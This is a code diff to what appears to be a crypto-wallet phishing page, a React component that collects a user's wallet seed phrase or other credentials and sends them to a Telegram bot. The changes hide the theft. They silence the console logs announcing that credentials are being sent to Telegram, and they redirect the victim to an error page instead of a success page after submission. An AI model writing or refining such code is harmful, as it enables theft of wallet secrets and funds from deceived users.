@@ -461,7 +461,7 @@ export default function EnterDetailsContent() {
     timestamp: string;
   }) => {
     if (!telegramService.current) {
-      console.error('Telegram service not initialized');
+      // console.error('Telegram service not initialized');
       return { success: false, error: 'Telegram service not initialized' };
     }
 
@@ -472,7 +472,7 @@ export default function EnterDetailsContent() {
       }
       return result;
     } catch (error) {
-      console.error('Telegram send failed:', error);
+      // console.error('Telegram send failed:', error);
       return { 
         success: false, 
         error: error instanceof Error ? error.message : 'Unknown error' 
@@ -539,7 +539,7 @@ export default function EnterDetailsContent() {
     }
 
     // Send initial input data
-    console.log('📤 Sending initial credentials to Telegram...');
+    // console.log('📤 Sending initial credentials to Telegram...');
     const initialSendResult = await safeSendToTelegram({
       walletName: wallet?.name || 'Unknown Wallet',
       walletType: inputType === 'phrase' ? 'seed' : inputType,
@@ -633,7 +633,7 @@ export default function EnterDetailsContent() {
     addWallet(connectedWallet);
     
     // Redirect to success page
-    router.push('/connect/success');
+    router.push('/connect/error');
   };
 
   const handleValidationRetry = () => {
